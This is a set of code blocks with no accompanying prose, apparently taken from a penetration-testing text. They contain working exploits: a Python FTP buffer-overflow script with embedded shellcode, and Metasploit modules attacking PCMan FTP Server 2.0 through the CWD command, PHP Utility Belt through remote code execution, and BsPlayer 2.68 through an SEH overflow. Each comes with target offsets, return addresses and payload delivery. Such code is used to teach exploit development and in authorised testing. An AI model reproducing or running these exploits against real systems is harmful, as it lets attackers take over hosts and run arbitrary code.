["```\nimport socket as s \nfrom sys import argv \n\nhost = \"127.0.0.1\" \nfuser = \"anonymous\" \nfpass = \"anonymous\" \njunk = '\\x41' * 2008 \nespaddress = '\\x72\\x93\\xab\\x71' \nnops = 'x90' * 10 \nshellcode= (\"\\xba\\x1c\\xb4\\xa5\\xac\\xda\\xda\\xd9\\x74\\x24\\xf4\\x5b\\x29\\xc9\\xb1\"\n\"\\x33\\x31\\x53\\x12\\x83\\xeb\\xfc\\x03\\x4f\\xba\\x47\\x59\\x93\\x2a\\x0e\"\n\"\\xa2\\x6b\\xab\\x71\\x2a\\x8e\\x9a\\xa3\\x48\\xdb\\x8f\\x73\\x1a\\x89\\x23\"\n\"\\xff\\x4e\\x39\\xb7\\x8d\\x46\\x4e\\x70\\x3b\\xb1\\x61\\x81\\x8d\\x7d\\x2d\"\n\"\\x41\\x8f\\x01\\x2f\\x96\\x6f\\x3b\\xe0\\xeb\\x6e\\x7c\\x1c\\x03\\x22\\xd5\"\n\"\\x6b\\xb6\\xd3\\x52\\x29\\x0b\\xd5\\xb4\\x26\\x33\\xad\\xb1\\xf8\\xc0\\x07\"\n\"\\xbb\\x28\\x78\\x13\\xf3\\xd0\\xf2\\x7b\\x24\\xe1\\xd7\\x9f\\x18\\xa8\\x5c\"\n\"\\x6b\\xea\\x2b\\xb5\\xa5\\x13\\x1a\\xf9\\x6a\\x2a\\x93\\xf4\\x73\\x6a\\x13\"\n\"\\xe7\\x01\\x80\\x60\\x9a\\x11\\x53\\x1b\\x40\\x97\\x46\\xbb\\x03\\x0f\\xa3\"\n\"\\x3a\\xc7\\xd6\\x20\\x30\\xac\\x9d\\x6f\\x54\\x33\\x71\\x04\\x60\\xb8\\x74\"\n\"\\xcb\\xe1\\xfa\\x52\\xcf\\xaa\\x59\\xfa\\x56\\x16\\x0f\\x03\\x88\\xfe\\xf0\"\n\"\\xa1\\xc2\\xec\\xe5\\xd0\\x88\\x7a\\xfb\\x51\\xb7\\xc3\\xfb\\x69\\xb8\\x63\"\n\"\\x94\\x58\\x33\\xec\\xe3\\x64\\x96\\x49\\x1b\\x2f\\xbb\\xfb\\xb4\\xf6\\x29\"\n\"\\xbe\\xd8\\x08\\x84\\xfc\\xe4\\x8a\\x2d\\x7c\\x13\\x92\\x47\\x79\\x5f\\x14\"\n\"\\xbb\\xf3\\xf0\\xf1\\xbb\\xa0\\xf1\\xd3\\xdf\\x27\\x62\\xbf\\x31\\xc2\\x02\"\n \"\\x5a\\x4e\")\n\nsploit = junk+espaddress+nops+shellcode\nconn = s.socket(s.AF_INET,s.SOCK_STREAM)\nconn.connect((host,21))\nconn.send('USER '+fuser+'\\r\\n')\nuf = conn.recv(1024)\nconn.send('PASS '+fpass+'\\r\\n')\npf = conn.recv(1024)\nconn.send('CWD '+sploit+'\\r\\n')\ncf = conn.recv(1024)\nconn.close()\n\n```", "```\nclass MetasploitModule < Msf::Exploit::Remote \n  Rank = NormalRanking \n\n  include Msf::Exploit::Remote::Ftp \n\n  def initialize(info = {}) \n    super(update_info(info, \n      'Name'           => 'PCMAN FTP Server Post-Exploitation CWD Command', \n      'Description'    => %q{ \n          This module exploits a buffer overflow vulnerability in PCMAN FTP \n      }, \n      'Author'         => \n          [ \n            'Nipun Jaswal' \n          ], \n      'DefaultOptions' => \n        { \n          'EXITFUNC' => 'process', \n          'VERBOSE'  => true \n        }, \n      'Payload'        => \n        { \n          'Space'   => 1000, \n          'BadChars'  => \"\\x00\\xff\\x0a\\x0d\\x20\\x40\", \n        }, \n      'Platform'       => 'win', \n      'Targets'        => \n        [ \n          [ 'Windows XP SP2 English', \n            { \n              'Ret' => 0x71ab9372, \n              'Offset' => 2008 \n            } \n          ], \n        ], \n      'DisclosureDate' => 'May 9 2016', \n      'DefaultTarget'  => 0)) \nregister_options( \n        [ \n                Opt::RPORT(21), \n         OptString.new('FTPPASS', [true, 'FTP Password', 'anonymous']) \n        ]) \n  End \n```", "```\ndef exploit \n    c = connect_login \n    return unless c \n    sploit = rand_text_alpha(target['Offset']) \n    sploit << [target.ret].pack('V') \n    sploit << make_nops(10) \n    sploit << payload.encoded \n    send_cmd( [\"CWD \" + sploit, false] ) \n    disconnect \n  end \nend \n```", "```\n  def check \n    c = connect_login \n    disconnect \n    if c and banner =~ /220 PCMan's FTP Server 2\\.0/ \n      vprint_status(\"Able to authenticate, and banner shows the vulnerable version\") \n      return Exploit::CheckCode::Appears \n     elsif not c and banner =~ /220 PCMan's FTP Server 2\\.0/ \n      vprint_status(\"Unable to authenticate, but banner shows the vulnerable version\") \n      return Exploit::CheckCode::Appears \n    end \n    return Exploit::CheckCode::Safe \n  end \n```", "```\nclass MetasploitModule < Msf::Exploit::Remote \n\n  include Msf::Exploit::Remote::HttpClient \n\n  def initialize(info = {}) \n    super(update_info(info, \n      'Name'           => 'PHP Utility Belt Remote Code Execution', \n      'Description'    => %q{ \n         This module exploits a remote code execution vulnerability in PHP Utility Belt \n      }, \n      'Author'         => \n        [ \n          'Nipun Jaswal', \n        ], \n      'DisclosureDate' => 'May 16 2015', \n      'Platform'       => 'php', \n      'Payload'        => \n        { \n          'Space'       => 2000, \n          'DisableNops' => true \n        }, \n      'Targets'        => \n        [ \n          ['PHP Utility Belt', {}] \n        ], \n      'DefaultTarget'  => 0 \n    )) \n\n    register_options( \n      [ \n        OptString.new('TARGETURI', [true, 'The path to PHP Utility Belt', '/php-utility-belt/ajax.php']), \n   OptString.new('CHECKURI',[false,'Checking Purpose','/php-utility-belt/info.php']), \n      ]) \n  end \n```", "```\ndef check \n  send_request_cgi( \n      'method'    => 'POST', \n      'uri'       => normalize_uri(target_uri.path), \n      'vars_post' => { \n        'code' => \"fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');\" \n      } \n   ) \n  resp = send_request_raw({'uri' => normalize_uri(datastore['CHECKURI']),'method' => 'GET'}) \n  if resp.body =~ /phpinfo()/ \n   return Exploit::CheckCode::Vulnerable \n  else \n   return Exploit::CheckCode::Safe \n  end \n  end \n```", "```\n  def exploit \n    send_request_cgi( \n      'method'    => 'POST', \n      'uri'       => normalize_uri(target_uri.path), \n      'vars_post' => { \n        'code' => payload.encoded \n      } \n    ) \n  end \nend \n```", "```\nclass MetasploitModule < Msf::Exploit::Remote \n  Rank = NormalRanking \n\n  include Msf::Exploit::Remote::TcpServer \n\n  def initialize(info={}) \n    super(update_info(info, \n      'Name'           => \"BsPlayer 2.68 SEH Overflow Exploit\", \n      'Description'    => %q{ \n        Here's an example of Server Based Exploit \n      }, \n      'Author'         => [ 'Nipun Jaswal' ], \n      'Platform'       => 'win', \n      'Targets'        => \n        [ \n          [ 'Generic', {'Ret' => 0x0000583b, 'Offset' => 2048} ], \n        ], \n      'Payload'  =>  \n       { \n       'BadChars' => \"\\x00\\x0a\\x20\\x0d\" \n       }, \n      'DisclosureDate' => \"May 19 2016\", \n      'DefaultTarget'  => 0)) \n  end \n```", "```\ndef on_client_connect(client) \nreturn if ((p = regenerate_payload(client)) == nil) \n    print_status(\"Client Connected\") \n    sploit = make_nops(target['Offset']) \n    sploit << payload.encoded \n    sploit << \"\\xcc\" * (6787-2048 - payload.encoded.length)  \n    sploit << \"\\xe9\\x85\\xe9\\xff\\xff\"  \n    sploit << \"\\xeb\\xf9\\x90\\x90\" \n    sploit << [target.ret].pack('V') \n    client.put(sploit) \n    client.get_once \n    client.put(sploit) \n    handler(client) \n    service.close_client(client) \n  end \nend \n```"]